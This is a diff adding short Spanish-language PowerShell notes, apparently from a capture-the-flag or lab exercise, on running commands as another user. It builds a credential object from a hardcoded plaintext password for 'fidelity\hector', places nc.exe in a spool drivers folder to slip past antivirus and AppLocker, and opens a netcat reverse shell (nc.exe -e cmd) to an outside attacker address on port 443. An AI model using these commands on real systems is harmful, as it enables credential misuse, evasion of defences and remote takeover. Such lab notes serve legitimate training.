@@ -1,0 +1,10 @@
+# Ponernos a ejecutar comandos con otro usuario como lo hemos llamado en este caso quiero ejecutar comandos como Hector para autentificarme como el
+$user = 'fidelity\hector'
+$password = ConvertTo-SecureString 'l33th4x0rhector' -AsPlainText -Force
+$cred = New-Object -TypeName System.Management.Automation.PSCredential -Argumentlist $user, $password
+Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock { whoami }
+
+# Despues de esto lo que quiero es ganar acceso con netcat al usuario Hector asi que lo que hago es pasarme a la maquina el nc.exe a un directorio el cual el AV no me lo detecte para esto tengo el archivo de AppLocker Bypass.
+
+Invoke-Command -ComputerName localhost -Cred $cred -ScriptBlock { C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.5
+2 443 }
